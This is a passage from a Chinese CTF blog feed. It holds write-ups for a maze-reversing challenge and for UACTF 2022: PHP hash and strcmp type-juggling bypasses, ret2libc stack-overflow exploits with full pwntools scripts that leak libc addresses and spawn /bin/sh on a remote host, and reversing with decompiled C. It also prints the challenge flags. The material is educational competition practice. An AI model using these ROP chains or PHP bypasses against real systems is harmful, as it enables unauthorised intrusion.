的exe程序，但真正的game程序部署在服务器上。我们需要根据现有的程序，推断程序的逻辑。再通过nc，得到五个被切分的flag文件，最后提交。</p><p>程序大体逻辑为，其通过设置迷宫游戏中五个特殊的位置。当走到这五个特殊的位置时，会提示你输入密码。如果你输入的密码正确，会显示flag的一部分。当你把全部的特殊位置全部解决之后，就可以按顺序把正确的flag拼接出来。</p><p>通过下面这个函数，我们可以看得出来<code>v7</code>的值只能是<code>0,1,2,3,4</code>。那么对应的<code>v8</code>同样也只能是 <code>0,1,2,3,4</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911165425.png" alt="关键函数1"></p><p>然后是<code>fnv_1a_32</code>函数,这里我不明白为什么反汇编出来居然有三个参数。但是通过汇编代码来看的话，只有一个参数。该函数就是异或操作，我们需要定位的就是这个参数。而这个参数通过<code>v8</code>就能确定。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911170324.png" alt="fnv_1a_32汇编代码"><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911170633.png" alt="函数逻辑"></p><p>因为v11已知，所以我们根据<code>v8</code>可以计算出相应的<code>pass</code>。</p><pre class="line-numbers language-py" data-language="py"><code class="language-py">while_count &#x3D; [0, 1, 2, 3, 4]a &#x3D; [    0x63, 0x6f, 0x6f, 0x6b,    0x00, 0x00, 0x00, 0x00,    0x00, 0x00, 0x66, 0x6c,    0x61, 0x77, 0x65, 0x64,    0x00, 0x00, 0x00, 0x00,    0x67, 0x72, 0x61, 0x76,0x65, 0x6c, 0x00, 0x00,    0x00, 0x00, 0x6b, 0x69,    0x6e, 0x67, 0x00, 0x00,    0x00, 0x00, 0x00, 0x00,    0x64, 0x65, 0x63, 0x69,    0x73, 0x69, 0x76, 0x65,    0x00, 0x00]for k in while_count:    result &#x3D; 2166136261    part &#x3D; a[10*k:]    #print(str(part))    for i in part:        if i &#x3D;&#x3D; 0:            break        result &#x3D; 16777619*(i ^ (result &amp; 0xFFFFFFFF))    print(result)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数可以计算出五个不同的值，接下来要做的，就是通过nc链接服务器，找到迷宫中的特殊位置，尝试这五个不同的密码。拼接所有的flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911171154.png" alt="结果"></p><p>这里找到特殊位置的方法，不知道有没有什么窍门。反正我是一个一个试的，纯粹是按照遍历的方法试出来的。按照顺序试就行。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911171521.png" alt="1-1路径"></p><p>最终flag为<code>flag&#123;e@5+er_e995_6ehind_p@yw@115_i5_+he_dum6e5+_ide@_ever!!&#125;</code></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Rev&quot;&gt;&lt;a href=&quot;#Rev&quot; class=&quot;headerlink&quot; title=&quot;Rev&quot;&gt;&lt;/a&gt;Rev&lt;/h1&gt;&lt;h2 id=&quot;DockREleakage&quot;&gt;&lt;a href=&quot;#DockREleakage&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="比赛" scheme="https://laobameishijia.github.io/tag/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>UACTF 2022比赛的WriteUp</title>
    <link href="https://laobameishijia.github.io/2022/08/15/uactf-2022-writeup/"/>
    <id>https://laobameishijia.github.io/2022/08/15/uactf-2022-writeup/</id>
    <published>2022-08-15T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.676Z</updated>
    
    <content type="html"><![CDATA[<p>简介：</p><p>本文为UACTF 2022比赛的WriteUp。本次还是与NING0121、meishijia一起组队参赛，最终在447支参赛队伍中排名21位。打怪升级中，再接再厉～</p><span id="more"></span><p>说明：本WriteUp中标志[Aha!]是赛后总结并参考其他师傅的WriteUp完成的，毕竟没有做出来的题更要记录学习。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="1-1-Trial-by-PHP"><a href="#1-1-Trial-by-PHP" class="headerlink" title="1-1 Trial by PHP"></a><strong>1-1 Trial by PHP</strong></h3><p>基础的 PHP 绕过技术。（题目中间有段时间提供了 php 脚本源码）</p><p>题目要求我们达到它所需要我们实现的三个目标，开始并没有思路，没有什么交互按钮，因此就尝试查看 robots.txt，发现存在 secret-source.php 文件。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/SYFwFZuYoVBUlNe4eJ8wdQ.png" alt="1"></p><p>接着进行访问，阅读逻辑后发现需要实现三个 success 才能够显示出 flag，于是首先尝试直接修改 html 的标签（果然异想天开），接着就需要首先三个条件。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-3.png" alt="2"></p><ol><li>超短 hash<br> 要求 ：md5_hash 后 == 0。<br> 思考：首先了解 == 的含义，hash_hmac 绕过方式。<br> 解决：由于 “==” 只判断值相同，因此我们只需要让 hash_hmac 返回 NULL即可，经查询发现 php 无法处理数组数据，因此只需要让 egg 为数组即可；</li><li>长度大于 hash<br> 要求：字符串加密长度 &lt; 字符串长度。<br> 思考：abs 的接收参数？<br> 解决：由于abs为绝对值函数，当输入字符串数据会返回0，进而生成的的 hash 为 “MA==”，长度为4，因此我们只需要赋值一个长于4字符的字符串即可。</li><li>获得参数但是避免特殊符号<br> 要求：既要获得“THROUGH_A_TRAP_LADEN_MAZE”参数，同时不能包含“_”。<br> 思考：开始想着通过二次URL编码绕过，后来发现不行。<br> 解决：’ . ‘ 在经过 $_GET 后会变成  ‘ _ ‘。</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-4.png" alt="3"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;17’5_13v1054_n07_13v105444&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-Juggler"><a href="#1-2-Juggler" class="headerlink" title="1-2 Juggler"></a><strong>1-2 Juggler</strong></h3><p>基础的 PHP 绕过技术。题目提供了验证的源码。</p><p>很明显我们需要绕过以下两部分内容，关键在于不知道 $secret 和 $password 两个参数。针对 $secret 我们很明显能通过 hash 后进行二次赋值，因此我们需要对 nonce 参数进行处理，因为 php 无法处理数组参数，因此我们构造 nonce 参数即可使函数返回 0，接着由于已知 username 为 admin，于此同时我们便获得了固定的 hmac 参数；第二要解决的就是 strcmp 问题，虽然不知道 $password 但是同样使用数组类型数据，便可以满足条件；</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-1.png" alt="4"></p><p>使用 burpsuite 拦截并修改数据如下即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-2.png" alt="5"></p><p>页面打印出了 flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/RhUs09PxOqfzokWQDGm_zg.png" alt="6"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;jugg1e_this_y0u_fi1thy_casua1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-3-Unhackable-Code-Runner-Aha"><a href="#1-3-Unhackable-Code-Runner-Aha" class="headerlink" title="1-3 Unhackable Code Runner [Aha!]"></a><strong>1-3 Unhackable Code Runner [Aha!]</strong></h3><p><a href="https://github.com/milan338/CTF-Writeups/tree/main/UACTF_2022">https://github.com/milan338/CTF-Writeups/tree/main/UACTF_2022</a></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h2><h3 id="2-1-something-something-win"><a href="#2-1-something-something-win" class="headerlink" title="2-1 something-something-win"></a><strong>2-1 something-something-win</strong></h3><p>基础的栈溢出题目。</p><p>查看汇编代码，mian函数中会调用sussy函数，sussy函数中存在通过read读入的栈溢出漏洞，代码中存在敏感的win函数，其功能是打开flag文件。</p><p>由于Sussy函数中会对栈的内容进行判断并以此为条件进行跳转，否则会直接exit。所以我们需要将栈以要求的方式填充，再最后将win函数的地址覆盖到栈中的ret位置。最终成功拿到Flag。</p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;R3T_70_D33Z&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-Warmup"><a href="#2-2-Warmup" class="headerlink" title="2-2 Warmup"></a><strong>2-2 Warmup</strong></h3><p>这是一道典型的ret2libc题目，题目给出了warmup可执行文件以及编译所用的libc。通过checksec可以看到其仅开启了NX保护措施。</p><p>通过反编译软件Ghidra的分析，我们可以看到程序逻辑：首先判断check1()函数的返回值是否为0，若不为0则进入do_stuff函数。其中check1函数和do_stuff函数如下所示。do_stuff函数中打印了puts函数在内存中的地址，并且存在read函数的栈溢出漏洞。所以我们的利用步骤是首先使得check1函数的返回值不为0，再根据打印的puts函数地址以及给出的glibc获取system以及”/bin/sh”字符串在内存中的地址，最后构造ROP链ret2libc获取shell。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/LuaUPWbAGEdOkaVaQg2Ymg.png" alt="7"></p><p>仅通过反汇编的代码我们试图使check1的返回值为0似乎是不可能的，所以我们还需要研究汇编代码。按照函数调用惯例，64位机器编译的程序的返回值优先被置于RAX寄存器中。同时，通过main函数中调用check1函数返回下一条语句，我们也可以看到其对EAX(RAX的低4字节)进行判断是否为0。所以我们需要关注Check1函数中RAX最后值的变化。该函数中，我们通过scanf(‘%lu’, &amp;input)获取一个unsigned long型，接着通过XMM0以及XMM1寄存器的一系列指令对RAX的值进行修改。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/w6zMVJ9M6MTfqBH0RVoIig.png" alt="8"></p><p>具体的指令说明如下所示。一个unsigned long型使用8字节表示，最大值为2^64-1，所以我们只需要使得scanf的输入超过此值为NULL即可。</p><pre class="line-numbers language-none"><code class="language-none"># 将RBP+8字节(double类型)地址的大小为64bit(8字节)的值赋给XMMO寄存器；MOVSD XMM0, qword ptr[RBP+input]# 判断两寄存器的值是否存在NULL，并对ZF，IF，CF寄存器赋值；# 参考https:&#x2F;&#x2F;www.felixcloutier.com&#x2F;x86&#x2F;ucomisdUCOMISD XMM0，XMM1# 如果PF寄存器为1，则对AL赋值为1；SETP AL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入do_stuff函数之后，我们只需要获取在glibc中被动态加载的system以及/bin/sh字符串的地址即可。对于给定的glibc库文件，其内部函数的偏移是固定的，但是其基地址需要被leak出来。真正程序执行时，glibc库函数在内存中的地址为库基地址+库内固定偏移。对于前者的计算，我们通过程序实际运行时某执行过的glibc库函数的实际地址(%p, put或printf泄漏)-其库内固定偏移获得。对于后者，在给定libc的情况，对于函数，我们可以通过<code>readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;system@@GLIBC_2.2.5&quot;</code>指令或者pwntools中ELF(‘./libc-2.31.so’).symbols[‘system’]来获取；对于字符串，我们通过<code>ROPgadget --binary mypwn --string &#39;/bin/sh&#39;</code>或者pwntools中调用<code>next(sh.search(&quot;/bin/sh&quot;))</code>来获取。</p><p>此外，在gdb运行时，我们可以通过命令<code>info proc map</code>来获取内存映射，然后通过`</p><p>info address system<code>和</code>find 0x80048000, 0xc0000000, “/bin/sh”`来查找函数和字符串来验证我们构造的地址是否正确。以上指令非常常用，所以在此记录一下。</p><p>然而，在获得system以及”/bin/sh”后构造ROP链，成功在本地kali上获得shell，但是远程总是无法打通。后来查阅到，在部分x86_64机器上，system函数调用会遇到movasp issue。原因是glibc中的库函数会使用到movaps指令，该指令用于数据传输但要求栈结构必须是16字节对齐的(这也是64位机器的函数调用惯例)。但是我们的ROP链的构造是以8字节为单位，所以可能会遇到该问题报错。解决方案是在ROP链中添加额外的ret指令使得栈16字节对齐或者跳过system函数开头的push指令即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/gxBQBJeZKthbMtE3oWIpRg.png" alt="9"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2-2-1.png" alt="10"></p><p>完整的Exp如下所示。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span><span class="token number">30005</span><span class="token punctuation">)</span><span class="token comment"># try to entry the while loop</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter the pincode: "</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'123456789012345678901234567890'</span><span class="token punctuation">)</span><span class="token comment"># receive the leaked address of puts function</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Uhm, not sure what is happening tbh.."</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\nI'm just going to help you out the tinyest bit.. "</span><span class="token punctuation">)</span>libc_puts_addr_d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"received the puts addr: %s"</span><span class="token punctuation">,</span> libc_puts_addr_d<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/lib/x86_64-linux-gnu/libc-2.33.so')</span>libc_puts_addr_s <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>libc_base_addr <span class="token operator">=</span> libc_puts_addr_d <span class="token operator">-</span> libc_puts_addr_ssystem_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x401255</span>ret_addr <span class="token operator">=</span> <span class="token number">0x40101a</span> <span class="token comment"># to solve the movaps issue</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-No-no-no-square"><a href="#2-3-No-no-no-square" class="headerlink" title="2-3 No no no square"></a><strong>2-3 No no no square</strong></h3><p>No no no square程序和warmup一致，均为ret2libc。但是Nonosquare中并没有打印出puts函数的地址，所以需要我们利用栈溢出来得到。</p><p>由于程序执行时调用了puts函数，所以利用思路就是：第一次栈溢出调用puts函数泄漏出GOT表中puts函数的全局偏移并最后跳转到main函数的开头；第二次栈溢出利用计算好的system函数以及/bin/sh字符串的地址完成ret2libc。</p><p>具体的来讲，动态链接的程序是如何装载到内存空间并运行的之后会详细地出一篇博客来详细地介绍。具体的Exp如下所示。</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *sh &#x3D; remote(&quot;xx.xx.xx.xx&quot;,30003)# try to entry the while loopsh.recvuntil(b&quot;This is going to be fun... is it?&quot;)nonosquare &#x3D; ELF(&#39;.&#x2F;nonosquare&#39;)puts_plt &#x3D; nonosquare.plt[&#39;puts&#39;] # 0x405000puts_got &#x3D; nonosquare.got[&#39;puts&#39;]main &#x3D; nonosquare.symbols[&#39;main&#39;]pop_rdi_addr &#x3D; 0x401343 # pop rdi; ret;payload &#x3D; b&#39;A&#39;*56 + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main)print(&quot;[*]Sending the first payload and leak the puts addr %s&quot; % payload)sh.sendline(payload)sh.recvuntil(b&quot;no no no&quot;)sh.recvuntil(b&quot;Did you have fun?&quot;)sh.recvuntil(b&quot;\n&quot;)libc_puts_addr_d &#x3D; u64(sh.recv()[:6].ljust(8,b&#39;\x00&#39;)) # 不足8字节补充print(libc_puts_addr_d)print(&quot;[*]Received the puts addr in libc: %d&quot; % libc_puts_addr_d)# sh.recvuntil(b&quot;This is going to be fun... is it?&quot;)# sh.recvuntil(b&quot;no no no&quot;)# sh.recvuntil(b&quot;Did you have fun?&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.31.so&#39;)libc_start_main_addr_s &#x3D; libc.symbols[&#39;puts&#39;]libc_base_addr &#x3D; libc_puts_addr_d - libc_start_main_addr_ssystem_addr &#x3D; libc_base_addr + libc.symbols[&#39;system&#39;]binsh_addr &#x3D; libc_base_addr + next(libc.search(b&quot;&#x2F;bin&#x2F;sh&quot;))ret_addr &#x3D; 0x40101a # to solve the movaps issuepayload &#x3D; b&#39;A&#39;*56 + p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)print(&quot;[*]Sending the second payload: %s&quot; % payload)sh.sendline(payload)sh.recvuntil(b&quot;no no no&quot;)sh.recvuntil(b&quot;Did you have fun?&quot;)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2-3-2.png" alt="11"></p><h3 id="2-4-Evil-Eval-Aha"><a href="#2-4-Evil-Eval-Aha" class="headerlink" title="2-4 Evil Eval [Aha!]"></a><strong>2-4 Evil Eval [Aha!]</strong></h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/nPRd3TLyFMCDf-S1gkhaCg.jpeg" alt="12"></p><h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a><strong>Reversing</strong></h2><h3 id="3-1-Sanity-Check"><a href="#3-1-Sanity-Check" class="headerlink" title="3-1 Sanity Check"></a><strong>3-1 Sanity Check</strong></h3><p>逆向的第一道题，直接使用逆向工具打开即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/dnuchhhOzEH1SUkK4IxdTw.png" alt="13">    </p><h3 id="3-2-MASON-Aha"><a href="#3-2-MASON-Aha" class="headerlink" title="3-2 MASON[Aha!]"></a><strong>3-2 MASON</strong><strong>[Aha!]</strong></h3><p>题目提供了ELF程序，该程序通过读取flag.txt中的字符串，并以该字符串作为种子，产生随机数生成加法公式。思路在于，通过交互程序首先判断字符串的长度并记录随机产生的数字，随后根据这些随机产生的数字，利用程序爆破的方式对原字符串进行还原。</p><p><strong>主函数逻辑</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/sdGz0iLYlrDRW3HbY-DLsQ.png" alt="14">     </p><p>读取flag.txt文件中的字符串</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/WI_JGGuyjQESWemayXrc9w.png" alt="15">        </p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0L_WvOZqD1D1jUi7MfoJaw.png" alt="16"> </p><p>reseed函数是读取字符串的四个字符，并以他们在内存当中的数据作为随机数产生的种子。__int64 s就是字符串的首地址，DWORD是双字，也就是四个字节，即四个字符。该函数，就相当于以首地址为基址，以4*i为偏移，大小为四个字节的字符串作为随机数产生的种子。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/q2ZI1sUX3Ru4eR-ZUn0rWw.png" alt="17"></p><p>l1 函数即根据产生的字符串构造随机的加法公式，并计算结果。同时判断后续用户输入的结果是否为正确答案。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">bool <span class="token function">l1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">size_t</span> v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-2B0h]</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-2ACh]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>endptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-2A8h] BYREF</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-2A0h]</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-298h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-290h] BYREF</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-288h]</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-280h]</span>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-278h]</span>  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-270h]</span>  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-268h]</span>  __int64 v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-260h]</span>  __int64 v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-258h]</span>  __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-250h]</span>  __int64 v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-248h]</span>  __int64 v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+70h] [rbp-240h]</span>  __int64 v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-238h]</span>  __int64 v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+80h] [rbp-230h]</span>  __int64 v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-228h]</span>  __int64 v22<span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-220h]</span>  __int64 v23<span class="token punctuation">;</span> <span class="token comment">// [rsp+98h] [rbp-218h]</span>  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+A0h] [rbp-210h] BYREF</span>  __int64 v25<span class="token punctuation">;</span> <span class="token comment">// [rsp+A8h] [rbp-208h]</span>  <span class="token keyword">char</span> v26<span class="token punctuation">[</span><span class="token number">496</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-200h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v27<span class="token punctuation">;</span> <span class="token comment">// [rsp+2A8h] [rbp-8h]</span>  v27 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//  2, 4,6,8,10,12。决定加法的项数</span>  v6 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v26<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v26<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1000000</span><span class="token punctuation">;</span>                    <span class="token comment">// 0-63</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v11 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v12 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v13 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v14 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v15 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v16 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v17 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v18 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v19 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v20 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v21 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v22 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v23 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>      v0 <span class="token operator">=</span> <span class="token string">"= ?"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      v0 <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%d %s "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">+=</span> v4<span class="token punctuation">;</span>    <span class="token operator">--</span>v3<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      s<span class="token 